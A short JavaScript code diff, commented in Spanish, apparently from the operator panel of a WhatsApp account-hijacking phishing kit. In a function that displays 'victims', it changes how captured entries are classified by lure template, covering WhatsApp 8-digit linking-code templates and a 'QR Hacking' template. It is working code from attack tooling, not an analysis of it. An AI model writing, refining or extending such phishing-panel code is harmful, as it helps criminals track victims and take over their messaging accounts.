@@ -429,10 +429,9 @@ function mostrarVictimas(snap) {
         //  DETECCIÓN EXACTA POR TEMPLATE
         // ══════════════════════════════════════════════════
 
-        // WhatsApp que usan código de 8 dígitos
-        const esWA_VipGroup  = tpl.includes("grupo7") || tpl.includes("vip") || tpl.includes("whatsapp normal");
-        const esWA_Advance   = tpl.includes("whaadvance") || tpl.includes("advance") || tpl.includes("whatsapp x");
-        const esWA_Codigo    = esWA_VipGroup || esWA_Advance; // cualquier WA con código
+   const esWA_VipGroup  = tpl === "wa vip group";
+const esWA_Advance   = tpl.includes("whaadvance") || tpl.includes("xxxx avance");
+const esWA_Codigo    = esWA_VipGroup || esWA_Advance;
 
         // QR Hacking
         const esQR = tpl.includes("qr");
